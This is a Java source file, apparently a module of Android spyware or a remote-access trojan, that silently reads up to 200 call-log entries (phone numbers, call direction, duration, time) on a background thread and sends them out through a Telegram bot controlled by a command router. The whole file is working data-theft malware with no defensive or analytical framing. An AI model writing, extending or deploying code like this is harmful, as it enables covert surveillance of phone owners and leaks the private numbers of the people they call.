// language: Java, file: ExfilCalls.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;

import java.util.Date;
import java.util.Locale;

public class ExfilCalls {

    public static void dump() {
        Thread t = new Thread(ExfilCalls::dumpSync, "v2-calls");
        t.setDaemon(true);
        t.start();
    }

    static void dumpSync() {
        Context c = TelegramBot.ctx;
        if (c == null) return;
        if (c.checkSelfPermission(Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            TelegramBot.send("<i>err: READ_CALL_LOG not granted</i>");
            return;
        }
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[] {
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE,
                },
                null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
            if (cur == null) { TelegramBot.send("<i>calls: null cursor</i>"); return; }
            StringBuilder b = new StringBuilder();
            b.append("<b>Call log</b> (").append(cur.getCount()).append(")\n\n");
            int i = 0;
            while (cur.moveToNext()) {
                String num = cur.getString(0);
                int type = cur.getInt(1);
                long dur = cur.getLong(2);
                long date = cur.getLong(3);
                String dir = type == CallLog.Calls.INCOMING_TYPE ? "↓"
                    : type == CallLog.Calls.OUTGOING_TYPE ? "↑"
                    : type == CallLog.Calls.MISSED_TYPE ? "✕" : "?";
                b.append(dir).append(" <code>").append(TelegramBot.esc(num))
                 .append("</code> · ").append(dur).append("s · <i>")
                 .append(fmt(date)).append("</i>\n");
                i++;
                if (i % 50 == 0 && b.length() > 3000) {
                    TelegramBot.send(b.toString());
                    b.setLength(0);
                }
            }
            if (b.length() > 0) TelegramBot.send(b.toString());
        } catch (Throwable t) {
            CommandRouter.err(t.getMessage());
        } finally {
            if (cur != null) try { cur.close(); } catch (Throwable ignored) {}
        }
    }

    static String fmt(long ms) {
        try {
            return new java.text.SimpleDateFormat("MM-dd HH:mm", Locale.US)
                .format(new Date(ms));
        } catch (Throwable t) { return "?"; }
    }
}